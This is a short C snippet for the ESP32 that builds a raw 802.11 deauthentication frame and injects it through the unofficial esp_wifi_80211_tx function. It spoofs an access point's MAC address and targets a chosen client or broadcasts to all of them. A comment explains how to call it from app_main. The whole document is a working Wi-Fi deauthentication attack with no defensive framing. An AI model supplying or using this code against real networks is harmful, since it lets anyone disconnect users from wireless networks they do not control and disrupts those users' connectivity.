#include "esp_wifi.h"
// ... (Required includes)

// Unofficial function to inject raw frames
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

void send_deauth(uint8_t *ap_mac, uint8_t *client_mac) {
    // 26-byte deauth frame structure
    uint8_t packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, 0x02, 0x00              // Seq + Reason
    };
    memcpy(&packet[10], ap_mac, 6); // Set Src/BSSID
    memcpy(&packet[16], ap_mac, 6);
    if (client_mac) memcpy(&packet[4], client_mac, 6); // Set Dest

    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
}

// Inside app_main: Initialize WiFi (AP mode), set channel, call send_deauth()
